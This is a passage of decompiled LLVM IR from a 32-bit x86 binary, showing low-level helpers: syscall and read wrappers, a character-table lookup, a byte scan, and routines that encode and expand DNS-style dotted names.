  uselistorder i32 4, { 108, 109, 110, 104, 102, 103, 105, 106, 107, 0, 5, 111, 112, 113, 114, 115, 116, 117, 118, 119, 20, 40, 63, 64, 65, 21, 22, 23, 120, 35, 1, 67, 6, 7, 202, 203, 204, 205, 206, 207, 147, 148, 66, 241, 86, 121, 122, 123, 124, 125, 126, 45, 127, 128, 129, 130, 48, 24, 131, 132, 133, 134, 25, 26, 27, 49, 28, 29, 50, 30, 135, 31, 136, 51, 32, 52, 53, 8, 149, 150, 54, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 41, 218, 242, 219, 243, 244, 250, 251, 255, 256, 257, 245, 36, 60, 87, 88, 246, 247, 248, 249, 9, 68, 69, 70, 71, 55, 89, 90, 91, 46, 157, 158, 159, 160, 72, 73, 74, 75, 76, 47, 10, 77, 78, 252, 253, 163, 164, 165, 166, 167, 168, 11, 169, 170, 171, 172, 173, 174, 175, 176, 161, 162, 177, 38, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 19, 198, 199, 39, 200, 12, 56, 137, 138, 37, 139, 140, 141, 142, 2, 13, 3, 254, 14, 143, 80, 220, 15, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 33, 34, 61, 57, 238, 239, 240, 151, 152, 42, 153, 81, 82, 83, 43, 44, 4, 84, 85, 154, 155, 79, 92, 93, 94, 95, 96, 97, 58, 98, 99, 100, 101, 144, 59, 145, 146, 156, 16, 17, 201, 18, 62 }
  uselistorder i32* @ebp, { 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 8, 9, 10, 11, 12, 13, 14, 2, 61, 62, 63, 68, 64, 65, 66, 67, 69, 167, 168, 70, 71, 72, 73, 74, 75, 76, 169, 170, 171, 172, 173, 7, 29, 30, 15, 16, 17, 31, 32, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 165, 161, 162, 163, 164, 1, 166, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 4, 174, 175, 176, 177, 178, 105, 0, 106, 107, 108, 109, 110, 111, 112, 113, 114, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 3, 195, 18, 19, 20, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 196, 197, 198, 144, 145, 146, 21, 22, 23, 24, 25, 26, 27, 28, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 88, 89, 90, 91, 92, 93, 94, 95, 96, 5, 97, 98, 99, 100, 6, 101, 102, 103, 104, 147, 199, 200 }
  uselistorder i32 %arg9, { 3, 1, 2, 0 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8051f41, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8051f07, { 1, 3, 0, 2, 4 }
  uselistorder label %dec_label_pc_8051ebd, { 1, 0 }
  uselistorder label %dec_label_pc_8051ea1, { 1, 0 }
  uselistorder label %dec_label_pc_8051e64, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8051e2b.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8051e51, { 1, 0 }
  uselistorder label %dec_label_pc_8051e1f, { 1, 0 }
  uselistorder label %dec_label_pc_8051f07.outer, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8051df1, { 1, 0 }
  uselistorder label %dec_label_pc_8051db6, { 1, 0 }
  uselistorder label %dec_label_pc_8051d0d, { 1, 0 }
  uselistorder label %dec_label_pc_8051c9d, { 1, 0 }
}

define i32 @function_8051f50(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051f50:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8051f52 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f52, i32* %stack_var_-12, align 4
  %v2_8051f5a = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8051f5a, i32* %esi.global-to-local, align 4
  %v1_8051f74 = call i32 @int80_syscall(i32 140)
  store i32 %v1_8051f74, i32* %esi.global-to-local, align 4
  %tmp16 = icmp ult i32 %v1_8051f74, -4095
  br i1 %tmp16, label %dec_label_pc_8051f8e, label %dec_label_pc_8051f80

dec_label_pc_8051f80:                             ; preds = %dec_label_pc_8051f50
  %v1_8051f80 = call i32 @function_804b7f4(i32 %arg3)
  %v0_8051f85 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051f85 = sub i32 0, %v0_8051f85
  %v2_8051f87 = inttoptr i32 %v1_8051f80 to i32*
  store i32 %v1_8051f85, i32* %v2_8051f87, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051f92

dec_label_pc_8051f8e:                             ; preds = %dec_label_pc_8051f50
  %v1_8051f8e = icmp eq i32 %v1_8051f74, 0
  br i1 %v1_8051f8e, label %dec_label_pc_8051f97, label %dec_label_pc_8051f92

dec_label_pc_8051f92:                             ; preds = %dec_label_pc_8051f8e, %dec_label_pc_8051f80
  %v0_8051f92 = phi i32 [ %v1_8051f74, %dec_label_pc_8051f8e ], [ -1, %dec_label_pc_8051f80 ]
  %v1_8051f94 = ashr i32 %v0_8051f92, 31
  br label %dec_label_pc_8051f9f

dec_label_pc_8051f97:                             ; preds = %dec_label_pc_8051f8e
  %v3_8051f97 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8051f9f

dec_label_pc_8051f9f:                             ; preds = %dec_label_pc_8051f92, %dec_label_pc_8051f97
  %v0_8051fa5 = phi i32 [ %v0_8051f92, %dec_label_pc_8051f92 ], [ %v3_8051f97, %dec_label_pc_8051f97 ]
  %storemerge = phi i32 [ %v1_8051f94, %dec_label_pc_8051f92 ], [ %tmp, %dec_label_pc_8051f97 ]
  store i32 %storemerge, i32* @edx, align 4
  %v2_8051fa2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051fa2, i32* @ebx, align 4
  ret i32 %v0_8051fa5

; uselistorder directives
  uselistorder i32 %v1_8051f74, { 1, 2, 0, 3 }
  uselistorder i32 31, { 20, 12, 21, 18, 19, 22, 23, 10, 2, 3, 0, 1, 8, 17, 13, 14, 15, 6, 7, 4, 5, 11, 24, 25, 16, 9 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_8051f9f, { 1, 0 }
}

define i32 @function_8051fa8(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051fa8:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051fa8 = load i32, i32* @edi, align 4
  store i32 %v0_8051fa8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8051fb8 = load i32, i32* @ebx, align 4
  %v4_8051fc0 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8051fb8, i32* @ebx, align 4
  store i32 %v4_8051fc0, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8051fc0, -4095
  br i1 %tmp, label %dec_label_pc_8051fd8, label %dec_label_pc_8051fcc

dec_label_pc_8051fcc:                             ; preds = %dec_label_pc_8051fa8
  %v1_8051fcc = call i32 @function_804b7f4(i32 %v0_8051fb8)
  %v0_8051fd1 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051fd1 = sub i32 0, %v0_8051fd1
  %v2_8051fd3 = inttoptr i32 %v1_8051fcc to i32*
  store i32 %v1_8051fd1, i32* %v2_8051fd3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051fd8

dec_label_pc_8051fd8:                             ; preds = %dec_label_pc_8051fa8, %dec_label_pc_8051fcc
  %v0_8051fd9 = phi i32 [ %v4_8051fc0, %dec_label_pc_8051fa8 ], [ -1, %dec_label_pc_8051fcc ]
  %v2_8051fdc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051fdc, i32* @edi, align 4
  ret i32 %v0_8051fd9

; uselistorder directives
  uselistorder i32 %v4_8051fc0, { 1, 0, 2 }
  uselistorder i32 %v0_8051fb8, { 1, 0 }
  uselistorder i32 (i32)* @function_804b7f4, { 36, 24, 45, 40, 39, 67, 44, 35, 23, 22, 43, 31, 30, 42, 21, 20, 57, 13, 12, 56, 11, 51, 29, 10, 65, 9, 8, 7, 6, 55, 66, 5, 2, 4, 38, 3, 28, 50, 49, 48, 47, 64, 63, 62, 27, 26, 41, 19, 18, 17, 0, 34, 33, 54, 53, 52, 14, 46, 37, 16, 1, 15, 25, 32, 61, 60, 59, 58 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 31, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder label %dec_label_pc_8051fd8, { 1, 0 }
}

define i32 @function_8051fe0(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051fe0:
  store i32 %arg1, i32* @edx, align 4
  %v1_8051fe4 = add i32 %arg1, 128
  %v6_8051fef = icmp ugt i32 %v1_8051fe4, 383
  br i1 %v6_8051fef, label %dec_label_pc_8051ffa, label %dec_label_pc_8051ff1

dec_label_pc_8051ff1:                             ; preds = %dec_label_pc_8051fe0
  %v0_8051ff1 = load i32, i32* bitcast (i32** @global_var_8055da8.133 to i32*), align 8
  %v2_8051ff6 = mul i32 %arg1, 2
  %v3_8051ff6 = add i32 %v0_8051ff1, %v2_8051ff6
  %v4_8051ff6 = inttoptr i32 %v3_8051ff6 to i16*
  %v5_8051ff6 = load i16, i16* %v4_8051ff6, align 2
  %v6_8051ff6 = sext i16 %v5_8051ff6 to i32
  store i32 %v6_8051ff6, i32* @edx, align 4
  br label %dec_label_pc_8051ffa

dec_label_pc_8051ffa:                             ; preds = %dec_label_pc_8051fe0, %dec_label_pc_8051ff1
  %v0_8051ffa = phi i32 [ %arg1, %dec_label_pc_8051fe0 ], [ %v6_8051ff6, %dec_label_pc_8051ff1 ]
  ret i32 %v0_8051ffa

; uselistorder directives
  uselistorder i32 65536, { 1, 0, 2, 3, 4, 6, 5, 8, 7, 10, 9, 12, 11, 13, 14, 15, 43, 45, 19, 16, 22, 23, 20, 17, 21, 18, 24, 28, 25, 31, 29, 26, 32, 33, 30, 27, 34, 35, 36, 37, 38, 39, 41, 40, 42, 44 }
  uselistorder i32 128, { 12, 8, 10, 3, 9, 4, 5, 11, 0, 6, 7, 13, 14, 15, 16, 17, 2, 1, 18 }
  uselistorder label %dec_label_pc_8051ffa, { 1, 0 }
}

define i32 @function_8052000(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052000:
  %v4_8052001 = ptrtoint i8* %arg1 to i32
  %v2_8052009 = mul i32 %arg2, 256
  %v3_8052009 = and i32 %v2_8052009, 65280
  %v4_8052009 = and i32 %arg2, -65281
  %v5_8052009 = or i32 %v3_8052009, %v4_8052009
  %v8_805200b.pre = load i1, i1* @df, align 1
  %v9_805200b = select i1 %v8_805200b.pre, i32 -1, i32 1
  br label %dec_label_pc_805200b

dec_label_pc_805200b:                             ; preds = %dec_label_pc_8052010, %dec_label_pc_8052000
  %v4_805200b = phi i32 [ %v6_805200b, %dec_label_pc_8052010 ], [ %v5_8052009, %dec_label_pc_8052000 ]
  %v7_805200b = phi i32 [ %v10_805200b, %dec_label_pc_8052010 ], [ %v4_8052001, %dec_label_pc_8052000 ]
  %v1_805200b = inttoptr i32 %v7_805200b to i8*
  %v2_805200b = load i8, i8* %v1_805200b, align 1
  %v10_805200b = add i32 %v7_805200b, %v9_805200b
  %v3_805200c = udiv i32 %v4_805200b, 256
  %v4_805200c = trunc i32 %v3_805200c to i8
  %v16_805200c = icmp eq i8 %v2_805200b, %v4_805200c
  br i1 %v16_805200c, label %dec_label_pc_8052019.loopexit, label %dec_label_pc_8052010

dec_label_pc_8052010:                             ; preds = %dec_label_pc_805200b
  %v3_805200b = zext i8 %v2_805200b to i32
  %v5_805200b = and i32 %v4_805200b, -256
  %v6_805200b = or i32 %v3_805200b, %v5_805200b
  %v4_8052010 = icmp eq i8 %v2_805200b, 0
  %v1_8052012 = icmp eq i1 %v4_8052010, false
  br i1 %v1_8052012, label %dec_label_pc_805200b, label %dec_label_pc_8052014

dec_label_pc_8052014:                             ; preds = %dec_label_pc_8052010
  br label %dec_label_pc_8052019

dec_label_pc_8052019.loopexit:                    ; preds = %dec_label_pc_805200b
  %phitmp = add i32 %v10_805200b, -1
  br label %dec_label_pc_8052019

dec_label_pc_8052019:                             ; preds = %dec_label_pc_8052019.loopexit, %dec_label_pc_8052014
  %v0_8052019 = phi i32 [ 0, %dec_label_pc_8052014 ], [ %phitmp, %dec_label_pc_8052019.loopexit ]
  ret i32 %v0_8052019

; uselistorder directives
  uselistorder i8 %v2_805200b, { 1, 2, 0 }
  uselistorder i32 %v4_805200b, { 1, 0 }
  uselistorder i32 -256, { 24, 1, 25, 0, 26, 11, 15, 27, 28, 3, 17, 16, 2, 29, 30, 6, 31, 4, 32, 5, 33, 34, 8, 19, 18, 7, 43, 44, 39, 45, 46, 47, 48, 49, 50, 12, 51, 52, 53, 63, 13, 20, 14, 64, 21, 9, 22, 65, 35, 40, 54, 55, 56, 57, 58, 59, 60, 10, 61, 62, 41, 23, 36, 37, 38, 42 }
  uselistorder i1* @df, { 1, 4, 10, 11, 0, 2, 12, 13, 14, 15, 3, 24, 25, 5, 6, 7, 8, 9, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_8052020(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8052020:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8052021 = load i32, i32* @edi, align 4
  %v0_8052022 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_8052029 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052029, i32* @edi, align 4
  %v1_80520885 = icmp eq i8* %arg1, null
  br i1 %v1_80520885, label %dec_label_pc_8052091, label %dec_label_pc_805208c.lr.ph

dec_label_pc_805208c.lr.ph:                       ; preds = %dec_label_pc_8052020
  br label %dec_label_pc_805208c

dec_label_pc_805202f:                             ; preds = %dec_label_pc_805208c
  %v0_805202f = load i32, i32* @edx, align 4
  %v9_8052034 = call i32 @function_8052000(i8* %v1_805208c, i32 46, i32 %v0_805202f, i32 %v0_805202f)
  %v1_805203c = icmp eq i32 %v9_8052034, 0
  br i1 %v1_805203c, label %dec_label_pc_8052048, label %dec_label_pc_8052042

dec_label_pc_8052042:                             ; preds = %dec_label_pc_805202f
  %v1_8052044 = load i32, i32* @edi, align 4
  %v2_8052044 = sub i32 %v9_8052034, %v1_8052044
  br label %dec_label_pc_8052056

dec_label_pc_8052048:                             ; preds = %dec_label_pc_805202f
  %v0_805204b = load i32, i32* @edi, align 4
  %v5_805204b = inttoptr i32 %v0_805204b to i8*
  %v3_805204c = call i32 @function_804d204(i8* %v5_805204b)
  br label %dec_label_pc_8052056

dec_label_pc_8052056:                             ; preds = %dec_label_pc_8052042, %dec_label_pc_8052048
  %v0_8052069 = phi i32 [ %v2_8052044, %dec_label_pc_8052042 ], [ %v3_805204c, %dec_label_pc_8052048 ]
  store i32 %v0_8052069, i32* @esi, align 4
  %v1_8052056 = icmp eq i32 %v0_8052069, 0
  %v3_8052056 = trunc i32 %v0_8052069 to i8
  br i1 %v1_8052056, label %dec_label_pc_80520a5, label %dec_label_pc_805205a

dec_label_pc_805205a:                             ; preds = %dec_label_pc_8052056
  %v1_805205e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805205e = sub i32 %arg3, %v1_805205e
  %v1_8052060 = add i32 %v2_805205e, -1
  %v7_8052061 = icmp ult i32 %v0_8052069, %v1_8052060
  %v1_8052063 = icmp eq i1 %v7_8052061, false
  br i1 %v1_8052063, label %dec_label_pc_80520a5, label %dec_label_pc_8052065

dec_label_pc_8052065:                             ; preds = %dec_label_pc_805205a
  store i32 %arg2, i32* @edx, align 4
  %v4_805206b = add i32 %v1_805205e, %arg2
  %v5_805206b = inttoptr i32 %v4_805206b to i8*
  store i8 %v3_8052056, i8* %v5_805206b, align 1
  %v0_805206e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805206e = add i32 %v0_805206e, 1
  %v0_8052070 = load i32, i32* @edx, align 4
  %v0_8052072 = load i32, i32* @esi, align 4
  %v2_8052073 = add i32 %v1_805206e, %v0_8052070
  %v0_8052075 = load i32, i32* @edi, align 4
  %v2_8052076 = add i32 %v0_8052072, %v1_805206e
  store i32 %v2_8052076, i32* %ebx.global-to-local, align 4
  %tmp30 = inttoptr i32 %v2_8052073 to i16*
  %v7_8052079 = call i32 @function_804d1a8(i16* %tmp30, i32 %v0_8052075, i32 %v0_8052072)
  %v1_8052085 = add i32 %v9_8052034, 1
  br i1 %v1_805203c, label %dec_label_pc_8052091, label %dec_label_pc_8052088

dec_label_pc_8052088:                             ; preds = %dec_label_pc_8052065
  store i32 %v1_8052085, i32* @edi, align 4
  %v1_8052088 = icmp eq i32 %v1_8052085, 0
  br i1 %v1_8052088, label %dec_label_pc_8052091, label %dec_label_pc_805208c

dec_label_pc_805208c:                             ; preds = %dec_label_pc_805208c.lr.ph, %dec_label_pc_8052088
  %v0_8052033 = phi i32 [ %v4_8052029, %dec_label_pc_805208c.lr.ph ], [ %v1_8052085, %dec_label_pc_8052088 ]
  %v1_805208c = inttoptr i32 %v0_8052033 to i8*
  %v2_805208c = load i8, i8* %v1_805208c, align 1
  %v3_805208c = icmp eq i8 %v2_805208c, 0
  %v1_805208f = icmp eq i1 %v3_805208c, false
  br i1 %v1_805208f, label %dec_label_pc_805202f, label %dec_label_pc_8052091

dec_label_pc_8052091:                             ; preds = %dec_label_pc_8052088, %dec_label_pc_805208c, %dec_label_pc_8052065, %dec_label_pc_8052020
  %tmp31 = icmp slt i32 %arg3, 1
  br i1 %tmp31, label %dec_label_pc_80520a5, label %dec_label_pc_8052098

dec_label_pc_8052098:                             ; preds = %dec_label_pc_8052091
  %v1_805209c = load i32, i32* %ebx.global-to-local, align 4
  %v2_805209c = add i32 %v1_805209c, %arg2
  %v3_805209c = inttoptr i32 %v2_805209c to i8*
  store i8 0, i8* %v3_805209c, align 1
  %v0_80520a0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80520a0 = add i32 %v0_80520a0, 1
  br label %dec_label_pc_80520a8

dec_label_pc_80520a5:                             ; preds = %dec_label_pc_805205a, %dec_label_pc_8052056, %dec_label_pc_8052091
  br label %dec_label_pc_80520a8

dec_label_pc_80520a8:                             ; preds = %dec_label_pc_8052098, %dec_label_pc_80520a5
  %storemerge3 = phi i32 [ %v1_80520a0, %dec_label_pc_8052098 ], [ -1, %dec_label_pc_80520a5 ]
  store i32 %v0_8052022, i32* @esi, align 4
  store i32 %v0_8052021, i32* @edi, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i8* %v1_805208c, { 1, 0 }
  uselistorder i32 %v1_8052085, { 0, 2, 1 }
  uselistorder i32 %v0_8052072, { 1, 0 }
  uselistorder i32 %v9_8052034, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @function_804d204, { 2, 5, 0, 4, 3, 6, 7, 8, 1 }
  uselistorder i32 46, { 1, 2, 0, 3 }
  uselistorder i8* null, { 4, 3, 2, 7, 0, 1, 6, 8, 9, 5, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder label %dec_label_pc_80520a8, { 1, 0 }
  uselistorder label %dec_label_pc_80520a5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052091, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805208c, { 1, 0 }
  uselistorder label %dec_label_pc_8052056, { 1, 0 }
}

define i32 @function_80520b0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80520b0:
  %ebp.global-to-local = alloca i32, align 4
  %v0_80520b2 = load i32, i32* @esi, align 4
  %v4_80520b7 = icmp eq i32 %arg1, 0
  store i32 %arg2, i32* @edx, align 4
  br i1 %v4_80520b7, label %dec_label_pc_805217e, label %dec_label_pc_80520c6

dec_label_pc_80520c6:                             ; preds = %dec_label_pc_80520b0
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_80521662541 = add i32 %arg2, %arg1
  %v3_80521662642 = inttoptr i32 %v2_80521662541 to i8*
  %v4_80521662743 = load i8, i8* %v3_80521662642, align 1
  %v1_805216a2945 = icmp eq i8 %v4_80521662743, 0
  %v1_805216c3046 = icmp eq i1 %v1_805216a2945, false
  br i1 %v1_805216c3046, label %dec_label_pc_80520d4.lr.ph, label %dec_label_pc_8052172

dec_label_pc_80520d4:                             ; preds = %dec_label_pc_80520d4.lr.ph, %dec_label_pc_80520ed
  %v0_80520de = phi i32 [ %v0_80520de.pre, %dec_label_pc_80520d4.lr.ph ], [ %v4_80520fe, %dec_label_pc_80520ed ]
  %v8_80520d437 = phi i1 [ %v8_80520d43151, %dec_label_pc_80520d4.lr.ph ], [ true, %dec_label_pc_80520ed ]
  %v5_805216636.in = phi i8 [ %v5_80521662850.in, %dec_label_pc_80520d4.lr.ph ], [ %v4_8052166, %dec_label_pc_80520ed ]
  %stack_var_-17.135 = phi i8 [ %stack_var_-17.1.ph49, %dec_label_pc_80520d4.lr.ph ], [ 0, %dec_label_pc_80520ed ]
  %v0_80520db34 = phi i32 [ %v0_80520db.ph47, %dec_label_pc_80520d4.lr.ph ], [ %v2_805210c, %dec_label_pc_80520ed ]
  %v5_805216636 = zext i8 %v5_805216636.in to i32
  %v1_80520db = add i32 %v0_80520db34, 1
  store i32 %v1_80520db, i32* @esi, align 4
  %v3_80520de = select i1 %v8_80520d437, i32 2, i32 1
  %v4_80520de = add i32 %v3_80520de, %v0_80520de
  store i32 %v4_80520de, i32* %ebp.global-to-local, align 4
  %v1_80520e1 = and i32 %v5_805216636, 192
  %v6_80520e6 = icmp eq i32 %v1_80520e1, 192
  %v1_80520eb = icmp eq i1 %v6_80520e6, false
  br i1 %v1_80520eb, label %dec_label_pc_8052110, label %dec_label_pc_80520ed

dec_label_pc_80520ed:                             ; preds = %dec_label_pc_80520d4
  %v2_80520fa = add i32 %v1_80520db, %arg1
  %v3_80520fa = inttoptr i32 %v2_80520fa to i8*
  %v4_80520fa = load i8, i8* %v3_80520fa, align 1
  %v5_80520fa = zext i8 %v4_80520fa to i32
  %v4_80520fe = add i32 %v3_80520de, %v4_80520de
  store i32 %v4_80520fe, i32* %ebp.global-to-local, align 4
  %v1_8052101 = mul nuw nsw i32 %v5_805216636, 256
  %v2_8052104 = and i32 %v1_8052101, 16128
  %v2_805210c = or i32 %v5_80520fa, %v2_8052104
  store i32 %v2_805210c, i32* @edx, align 4
  store i32 %v1_805212d.ph48, i32* @ecx, align 4
  %v2_8052166 = add i32 %v2_805210c, %arg1
  %v3_8052166 = inttoptr i32 %v2_8052166 to i8*
  %v4_8052166 = load i8, i8* %v3_8052166, align 1
  %v1_805216a = icmp eq i8 %v4_8052166, 0
  %v1_805216c = icmp eq i1 %v1_805216a, false
  br i1 %v1_805216c, label %dec_label_pc_80520d4, label %dec_label_pc_8052172

dec_label_pc_8052110:                             ; preds = %dec_label_pc_80520d4
  %v2_8052110 = add i32 %v5_805216636, %v1_805212d.ph48
  %v1_8052115 = add i32 %v2_8052110, 1
  store i32 %v1_8052115, i32* @edi, align 4
  %v10_8052116 = icmp ult i32 %v1_8052115, %arg4
  %v1_805211e = icmp eq i1 %v10_8052116, false
  br i1 %v1_805211e, label %dec_label_pc_805217e, label %dec_label_pc_8052120

dec_label_pc_8052120:                             ; preds = %dec_label_pc_8052110
  %v2_8052126 = add i32 %v1_80520db, %arg1
  %v2_805212d = add i32 %v1_805212d.ph48, %arg3
  %v3_8052130 = inttoptr i32 %v2_805212d to i16*
  %v4_8052130 = call i32 @function_804d1a8(i16* %v3_8052130, i32 %v2_8052126, i32 %v5_805216636)
  %v0_805213c = load i32, i32* %ebp.global-to-local, align 4
  %v0_8052145 = load i32, i32* @esi, align 4
  %v2_8052145 = add i32 %v0_8052145, %v5_805216636
  store i32 %v2_8052145, i32* @edx, align 4
  %v1_805214c = icmp eq i1 %v8_80520d437, false
  %v2_805213c = select i1 %v1_805214c, i32 %v5_805216636, i32 0
  %v4_805214c = add i32 %v0_805213c, %v2_805213c
  store i32 %v4_805214c, i32* %ebp.global-to-local, align 4
  %v4_805215d = add i32 %v2_8052110, %arg3
  %v5_805215d = inttoptr i32 %v4_805215d to i8*
  store i8 46, i8* %v5_805215d, align 1
  %v0_8052160.pre = load i32, i32* @edi, align 4
  %v1_8052166.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_8052160.pre, i32* @ecx, align 4
  %v2_805216625 = add i32 %v1_8052166.pre.pre, %arg1
  %v3_805216626 = inttoptr i32 %v2_805216625 to i8*
  %v4_805216627 = load i8, i8* %v3_805216626, align 1
  %v1_805216a29 = icmp eq i8 %v4_805216627, 0
  %v1_805216c30 = icmp eq i1 %v1_805216a29, false
  %v8_80520d431 = icmp eq i8 %stack_var_-17.135, 0
  %v0_80520de.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_805216c30, label %dec_label_pc_80520d4.lr.ph, label %dec_label_pc_8052172

dec_label_pc_80520d4.lr.ph:                       ; preds = %dec_label_pc_8052120, %dec_label_pc_80520c6
  %v0_80520de.pre = phi i32 [ 0, %dec_label_pc_80520c6 ], [ %v0_80520de.pre.pre, %dec_label_pc_8052120 ]
  %v8_80520d43151 = phi i1 [ false, %dec_label_pc_80520c6 ], [ %v8_80520d431, %dec_label_pc_8052120 ]
  %v5_80521662850.in = phi i8 [ %v4_80521662743, %dec_label_pc_80520c6 ], [ %v4_805216627, %dec_label_pc_8052120 ]
  %stack_var_-17.1.ph49 = phi i8 [ 1, %dec_label_pc_80520c6 ], [ %stack_var_-17.135, %dec_label_pc_8052120 ]
  %v1_805212d.ph48 = phi i32 [ 0, %dec_label_pc_80520c6 ], [ %v0_8052160.pre, %dec_label_pc_8052120 ]
  %v0_80520db.ph47 = phi i32 [ %arg2, %dec_label_pc_80520c6 ], [ %v1_8052166.pre.pre, %dec_label_pc_8052120 ]
  br label %dec_label_pc_80520d4

dec_label_pc_8052172:                             ; preds = %dec_label_pc_8052120, %dec_label_pc_80520ed, %dec_label_pc_80520c6
  %v0_8052177 = phi i32 [ 0, %dec_label_pc_80520c6 ], [ %v4_80520fe, %dec_label_pc_80520ed ], [ %v0_80520de.pre.pre, %dec_label_pc_8052120 ]
  %v8_80520d4.lcssa = phi i1 [ false, %dec_label_pc_80520c6 ], [ true, %dec_label_pc_80520ed ], [ %v8_80520d431, %dec_label_pc_8052120 ]
  %v2_8052179 = zext i1 %v8_80520d4.lcssa to i32
  %v3_8052179 = add i32 %v0_8052177, 1
  %v4_8052179 = add i32 %v3_8052179, %v2_8052179
  br label %dec_label_pc_8052181

dec_label_pc_805217e:                             ; preds = %dec_label_pc_8052110, %dec_label_pc_80520b0
  br label %dec_label_pc_8052181

dec_label_pc_8052181:                             ; preds = %dec_label_pc_8052172, %dec_label_pc_805217e
  %storemerge = phi i32 [ %v4_8052179, %dec_label_pc_8052172 ], [ -1, %dec_label_pc_805217e ]
  store i32 %v0_80520b2, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805212d.ph48, { 2, 1, 0 }
  uselistorder i8 %v4_8052166, { 1, 0 }
  uselistorder i32 %v2_805210c, { 0, 2, 1 }
  uselistorder i32 %v4_80520fe, { 0, 2, 1 }
  uselistorder i32 %v5_805216636, { 2, 4, 1, 3, 5, 0 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i8 1, { 2, 6, 9, 3, 0, 8, 7, 5, 1, 4 }
  uselistorder i8 46, { 6, 7, 5, 0, 1, 2, 3, 4 }
  uselistorder i32 (i16*, i32, i32)* @function_804d1a8, { 1, 2, 3, 4, 12, 13, 14, 7, 8, 15, 16, 18, 6, 5, 9, 10, 11, 17, 0 }
